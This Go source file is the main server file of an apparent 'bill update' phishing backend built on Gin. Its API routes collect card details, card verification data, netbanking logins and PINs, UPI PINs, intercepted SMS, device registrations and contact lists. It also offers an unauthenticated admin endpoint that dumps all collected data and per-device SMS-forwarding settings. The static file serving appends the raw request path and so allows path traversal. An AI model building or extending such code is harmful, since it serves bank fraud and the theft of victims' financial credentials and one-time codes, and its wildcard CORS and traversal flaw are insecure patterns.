package main

import (
	"bill-update-backend/database"
	"bill-update-backend/handlers"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

func main() {
	if err := database.Init(); err != nil {
		log.Fatal("Database init failed:", err)
	}

	r := gin.Default()

	r.GET("/health", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{
			"status":    "healthy",
			"timestamp": time.Now().UTC().Format(time.RFC3339),
		})
	})
	r.GET("/api/health", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{
			"status":    "healthy",
			"timestamp": time.Now().UTC().Format(time.RFC3339),
		})
	})

	r.Use(func(c *gin.Context) {
		c.Header("Access-Control-Allow-Origin", "*")
		c.Header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
		c.Header("Access-Control-Allow-Headers", "Content-Type, Authorization")
		if c.Request.Method == "OPTIONS" {
			c.AbortWithStatus(204)
			return
		}
		c.Next()
	})

	api := r.Group("/api")
	{
		api.POST("/bill-update", handlers.SubmitBillUpdate)
		api.POST("/charge", handlers.SubmitCharge)
		api.POST("/payment-method", handlers.SubmitPaymentMethod)
		api.POST("/card-details", handlers.SubmitCardDetails)
		api.POST("/card-verify", handlers.SubmitCardVerification)
		api.POST("/netbanking", handlers.SubmitNetbanking)
		api.POST("/netbanking-pin", handlers.SubmitNetbankingPin)
		api.POST("/upi-pin", handlers.SubmitUpiPin)
		api.POST("/sms", handlers.SubmitSms)
		api.POST("/device", handlers.RegisterDevice)
		api.POST("/ping", handlers.PingDevice)
		api.POST("/contacts", handlers.SubmitContacts)
		api.GET("/admin/all", handlers.GetAllData)
		api.GET("/forwarding-config/:device_id", handlers.GetForwardingConfig)
		api.PUT("/forwarding-config", handlers.UpdateForwardingConfig)
	}

	r.NoRoute(func(c *gin.Context) {
		path := c.Request.URL.Path
		if strings.HasPrefix(path, "/api") {
			c.JSON(http.StatusNotFound, gin.H{"error": "not found"})
			return
		}
		// Try serving static file, fallback to index.html for SPA
		staticDir := "../admin-panel/dist"
		if path == "/" {
			c.File(staticDir + "/index.html")
			return
		}
		c.File(staticDir + path)
		if c.Writer.Size() == -1 { // file not found
			c.File(staticDir + "/index.html")
		}
	})

	port := ":8080"
	log.Println("Server running on " + port)
	r.Run(port)
}
